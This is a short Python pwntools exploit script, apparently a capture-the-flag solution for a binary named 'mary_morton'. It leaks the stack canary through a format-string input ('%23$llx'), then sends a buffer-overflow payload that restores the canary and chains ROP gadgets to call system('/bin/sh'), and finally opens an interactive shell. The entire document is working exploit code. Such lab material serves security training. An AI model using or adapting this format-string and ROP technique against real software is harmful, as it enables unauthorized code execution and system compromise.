import pwn as p

target = p.process('mary_morton')
# p.gdb.attach(target, gdbscript='b *0x004009a5')
# input()  # used to synchronize with gdb


print(target.recvuntil('Exit the battle \n'))

target.sendline('2')
target.sendline('%23$llx')  # llx because we are on 64 bits
canary_raw = target.recvline().strip()

canary = int(canary_raw, 16)
print('canary:', hex(canary))

print(target.recvuntil('Exit the battle \n'))

target.sendline('1')

pop_rdi_addr = 0x400ab3
system_addr = 0x4006a0
binsh_addr = 0x400b2b
ret_addr = 0x400659

payload = b'\x30' * 0x88
payload += p.p64(canary)
payload += p.p64(0x0)  # padding between canary and return address
payload += p.p64(ret_addr)  # align memory so everyone is happy
payload += p.p64(pop_rdi_addr)
payload += p.p64(binsh_addr)
payload += p.p64(system_addr)

target.send(payload)

target.interactive()
